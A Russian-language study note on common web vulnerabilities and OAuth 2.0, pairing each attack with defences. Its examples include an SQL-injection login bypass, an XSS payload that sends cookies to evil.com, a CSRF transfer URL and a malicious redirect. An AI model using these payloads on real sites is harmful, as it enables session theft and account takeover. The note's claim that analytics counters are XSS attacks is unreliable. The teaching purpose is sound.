# Безопасность, уязвимости и методы защиты приложений
+ Идентификация — процесс распознавания пользователя по его идентификатору.
+ Аутентификация — процедура проверки подлинности, доказательство что пользователь именно тот, за кого себя выдает.
+ Авторизация — предоставление определённых прав.

## Injections
+ Внедрение специального кода в приложение при недостаточной/отсутствующей проверке данных от пользователя
+ **ПРИМЕР**:
    + Общими словами: при отправке данных через инпуты или в виде параметров в урл,
    SQL инъекция может внести какие-то неправомерные изменения данных или структуры данных
    + Технически (отключаем проверку пароля):
        + SQL-инъекция в запросе ('%20' - это пробел, '--' - это начало комментария чтобы отбросить пароль):
        ```
        site.com?username=admin'%20--%20&pass='1'
        ```
        + Небезопасная обработка параметров на сервере:
        ```
        String sql = "select * from user where username = '" + username + "' and pass= '" + pass + "'";
        ```
+ **ЗАЩИТА**:
    + Фильтрация параметров, работающих с базой данных
        + Проверка валидности числовых параметров
        + Проверка валидности строковых параметров
        + Экранирование символов
        + В Java SE при передаче параметров в SQL-запрос вместо конкатенации запроса использовать PreparedStatement - 
        он автоматически экранирует ковычки
        + В Hibernate использовать named params вместо конкатенации (для HQL или native query)


## Broken Authentication and Session Management
+ Неправильная реализация механизмов аутентификации и сессий
+ Пояснение о сессионных куках(sessionId/JSESSIONID и др.)
    + Для того, чтобы отличать одного пользователя от другого, 
    web-приложение использует так называемые сессионные куки. 
    После того, как Вы ввели логин и пароль и приложение вас авторизовало, 
    в хранилище браузера сохраняется специальный идентификатор, 
    который браузер в дальнейшем предъявляет серверу при каждом запросе страницы вашего web-приложения. 
    Именно так web-приложение понимает, что Вы это именно Вы.
+ **ПРИМЕР**:
    + Broken Authentication - злоумышленник раздобыл чужой логин и смог авторизоваться с помощью подбора пароля. Причины:
        + Разрешаем автоматические атаки (не имеем капчи)
        + Разрешаем слабые или известные пароли, такие как «Пароль: 1» или «admin / admin»
        + Используем простые текстовые, не зашифрованные или слабо хешированные пароли
        + Отсутствует или неэффективна многофакторная аутентификация
    + Broken Session Management - злоумышленник раздобыл чужой sessionId и смог под ним зайти в чужую сессию. Причины:
        + Передача важных данных в составе строки GET-запроса (если передать ссылку кому-то, то он сможет получить доступ к вашему аккаунту)
        + Незащищенная кука ```sessionId``` (отсутствуют флаги ```Secure```, ```HTTPonly``` и др.)
+ **ЗАЩИТА**:
    + Передача учетных данных по HTTPS
    + Многофакторная аутентификация для предотвращения автоматических атак
    + Проверка плохих паролей
    + Не отправлять данные аутентификации и сеанса методом GET (только POST)
    + Куки ID сессии должны защищаться флагами:
        + ```Secure``` - передача только по SSL/HTTPS
        + ```HTTPonly``` - Куки HTTPonly не доступны из JavaScript через свойства ```document.cookie``` API
        + И опционально одним из (если их не указывать, то куки хранятся до окончания сессии - закрытия браузера):
            + ```Expire=<date>``` - дата истечения срока действия куков
            + ```Max-Age=<number>``` - количество секунд до истечения срока действия куков
    + ```AUTOCOMPLETE=OFF``` - предотвращение автозаполнения полей авторизационных данных
    + Проверка IP-адреса сессии - каждый юзер со своим IP (только для статических IP)
    + Проверки наличия более одного соединения в одной сессии
        
        
## XSS (Cross Site Scripting)
+ Межсайтовый скриптинг - ошибка валидации пользовательских
данных, которая позволяет передать JavaScript код на исполнение в
браузер пользователя.
+ Атаки такого рода часто также называют ```HTML-инъекциями```,
 ведь механизм их внедрения очень схож с SQL-инъекциями,
но в отличие от последних, внедряемый код исполняется в браузере
+ **ПРИМЕР**:
    + Общими словами: например, размещаем комментарий со скриптом, отправляющим куки или ID сессии пользователя на сторонний сервер злоумышленника.
    + Технически: внедряем в БД приложения скрипт, который при появлении на UI будет совершать вредоносные действия 
    (например отправка куков жертвы на сторонний сайт):
        + Через известные параметры в урл 
        ```
        http://vulnsite.com/search.php?q=<script>XSS();</script>
        ```
        + Через инпуты, например, созданием коммента с вредоносным скриптом, который будет срабатывать при открытии страницы пользователями
        ```javascript
        <script>document.location="https://www.evil.com?foo="+document.cookie</script>
        ```
        ```javascript
        <img src="https://ru.fishki.net/picsw/102012/05/post/epic/tn.jpg" onload="alert('XSS')">
        ```
    + Практически любой счетчик посещений сайта или аналитический инструмент по типу Google Analytic является XSS атакой, собирая данные о посетителях.
    + Кроссдоменные AJAX запросы также можно отнести к безвредным XSS атакам.
    + Пассивные - это XSS, которые требуют от жертвы непосредственного участия (открыть ссылку, щелкнуть по картинке и т.д.)
    + Активные - это XSS, которые не требуют никаких действий со стороны жертвы - ей достаточно лишь открыть страницу с XSS и скрипт автоматически запустится
+ **ЗАЩИТА**:
    + Фильтрация параметров входных данных
    + Кодирование входных данных
    + Экранирование спецсимволов HTML
    + Где возможно отображать информацию через textContent (innerHTML не экранирует тэги) 
    + На JSP использовать станд. тэг ```<c:out value="${object.field}"/>```


## Insecure Direct Object References
+ Незащищенные ресурсы и объекты
+ Суть ее заключается в том, что при выводе каких-либо конфиденциальных данных, например личных сообщений или учетных карточек клиентов, 
для доступа к объекту используется идентификатор, который передается в открытом виде в адресной строке браузера, 
и не реализована проверка прав доступа к объектам.
+ **ПРИМЕР**:
    + Например, есть страница, которая отображает личное сообщение и она имеет адрес вида:
    ```mysite.ru/read_message.jsp?id=123654```
    + Перебором ID-шников можно будет читать чужие сообщения
+ **ЗАЩИТА**:
    + Непередавать внутренние идентификаторы, либо проверять наличие прав доступа на них


## Security Misconfiguration
+ Небезопасная конфигурация окружения
+ Безопасность Web-приложения требует наличия безопасной
  конфигурации всех компонентов инфраструктуры: компонентов
  приложения (таких как фреймворки – frameworks), веб-сервера, сервера
  баз данных и самой платформы. Настройки компонентов сервера по-
  умолчанию зачастую небезопасны и открывают возможности к атакам.
+ **ПРИМЕР**:
    + Например, кража сессионной cookie через JavaScript при XSS-атаке
        становится возможна благодаря выключенной по-умолчанию настройке
        cookie_http only.
+ **ЗАЩИТА**:
    + Всегда проверять настройки БД, сервера, фреймворков и т.д.


## Missing Function Level Access Control
+ Отсутствие проверки прав доступа на уровне функций
+ Большинство веб-приложений проверяют права доступа, прежде чем
  отобразить данные в пользовательском интерфейсе. Тем не менее,
  приложения должны выполнять те же проверки контроля доступа на
  сервере при запросе любой функции. Ведь есть еще множество
  вспомогательных служебных запросов, которые, зачастую отправляются
  в фоновом режиме асинхронно, при помощи технологии AJAX.
+ **ПРИМЕР**:
    + Частный, и пожалуй, самый распространенный случай данной
      уязвимости мы уже рассмотрели в ```Insecure Direct Object References``` – отсутствие
      проверки пользователя в личных сообщениях.
+ **ЗАЩИТА**:
    + Дополнительные проверки прав доступа в подзапросах


## Cross-Site Request Forgery (CSRF)
+ Межсайтовая подделка запроса
+ **ПРИМЕР**:
    + Предполагается, что жертва должна была предварительно пройти аутентификацию в платежной системе и 
    должна быть открыта активная сессия (скажем, страница платежной системы открыта в другой вкладке браузера).
    + Например, в некоторой платежной системе для перевода средств на другой аккаунт, есть страница вида:
    ```demobank.com/transfer_money.jsp?transfer_amount=1000&transfer_account=123456789```
        + где transfer_amount – сумма для перевода и transfer_account – номер аккаунта, куда должны быть переведены средства.
    + Вариант 1. Жертве скидывают ссылку на страницу банка, в которой уже прописаны параметры transfer_amount и transfer_account -
     происходит перевод денег на счет злоумышленника
    + Вариант 2. Жертва заходит на сайт, созданный злоумышленником, 
        который от её лица отправляет запрос на другой, легальный сервер, 
        к примеру на сервер платёжной системы.
+ **ЗАЩИТА**:
    + Все делать через POST, т.к.:
        + Если жертве подбросили плохую ссылку, то открыв ее в браузере будет GET и сервер не станет ее обрабатывать 
        + POST скрывает параметры в теле (тип form-data)
    + Добавление токена. 
        + Под токеном имеется в виду случайный набор байт, который сервер передает клиенту, а клиент возвращает серверу.
        Защита сводится к проверке токена, который сгенерировал сервер, и токена, который прислал пользователь.
        + ПОДРОБНЕЕ О ТОКЕНАХ
            + При старте сессии на стороне сервера генерируется токен.
            + Токен кладется в хранилище данных сессии (т.е. сохраняется на стороне сервера для последующей проверки)
            + В ответ на запрос (который стартовал сессию) клиенту возвращается токен.
            + Если рендеринг происходит на сервере, то токен может возвращаться внутри HTML, как, например, одно из полей формы, или внутри ```<meta>``` тега 
            + В случае, если ответ возвращается для JS приложения, токен можно передавать в header (часто для этого используют X-CSRF-Token)
            + При последующих запросах клиент обязан передать токен серверу для проверки.
            + При рендере контента сервером токен принято возвращать внутри POST данных формы.
            + JS приложения обычно присылают XHR запросы с header (X-CSRF-Token), содержащим токен.
            + При получения запроса небезопасным методом (POST, PUT, DELETE, PATCH) сервер обязан проверить на идентичность токен из данных сессии и токен, который прислал клиент.
            + Если оба токена совпадают, то запрос не подвергся CSRF-Атаке, в ином случае — логируем событие и отклоняем запрос.


## Using Components with Known Vulnerabilities	
+ **ПРИМЕР**:
    + Использование компонентов с известными уязвимостями
+ **ЗАЩИТА**:
    + Использовать последние версии компонентов и следить за появляющимися известными уязвимостями на сайтах типа securityfocus.com.


## Unvalidated Redirects and Forwards
+ Непроверенные переадресации и пересылки
+ Злоумышленник скидывает ссылку жертве, домен кажется правильным, но в параметрах на редирект указан вредоносный сайт
+ **ПРИМЕР**:
    + Безвердный редирект:
    ```
    http://www.mysite.com/redirect?url=mysite.com/profile
    ```
    + Редирект на хакерский сайт
    ```
    http://www.mysite.com/redirect?url=malicous.com/attack
    ```
+ **ЗАЩИТА**:
    + Не позволять редиректы с вводом от пользователя
    + Выдавать предупреждение типа: "Вы переходите на непроверенный ресурс"
    + Белый список урлов


## Протокол OAuth 2.0
+ Имеется какое-то клиентское приложение. Оно авторизует пользователя у себя с помощью стороннего провайдера (например Google или другие известные системы где пользователи часто имеют аккаунты) получая от провайдера только открытые авторизационные данные пользователя и не имея доступа к его паролям. Провайдер выдает клиенту временный токен, с помощью которого клиент сможет получить доступ к неким защищенным ресурсам юзера (например фото в Google Фото) 
+ <img alt="oauth2.png" src="resources/oauth2.png"/>
1. Клиентское приложение предлагает юзеру перейти на страницу авторизации провайдера
2. Юзер логинится на странице провайдера и предоставляет разрешение клиенту, провайдер редиректит на домен клиента и передает некий уникальный code юзера (также есть state для защиты от CSRF)
3. Клиент должен быть заранее зарегестрирован у провайдера и иметь статические client_id и client_secret. Используя их он передает ранее полученный code юзера в сервер авторизации провайдера
4. Если в п. 3 все креды верные, то в ответ клиенту приходит access_token юзера
5. Исспользуя access_token может запрашивать защищенные ресурсы юзера
6. Если токен свежий, то ресурсные сервера предоставляют запрашиваемые ресурсы

#### OAuth 2.0 в микросервисах
+ Пример с UI (регистрацию юзера в провайдере не рассматриваем, она не входит в протокол OAuth 2.0)
    + UI авторизует юзера отправляя его login/pass на auth-server
    + auth-server ищет юзера в БД, если все ок, то возвращает access_token
    + UI сохраняет access_token в localStorage и далее делает все запросы к resource-server используя access_token
    + resource-server проверяет токен запросом к auth-server
+ Пример взаимодействия сервер-сервер
    + client-server заранее зарегистрирован на auth-server с client_id/client_secret
    + client-server получает свой сервисный access_token делая запрос в auth-server с client_id/client_secret в хедере Authorization
    + client-server, используя access_token, делает запросы в resource-server
    + client-server1 может быть одновременно resource-server для client-server2 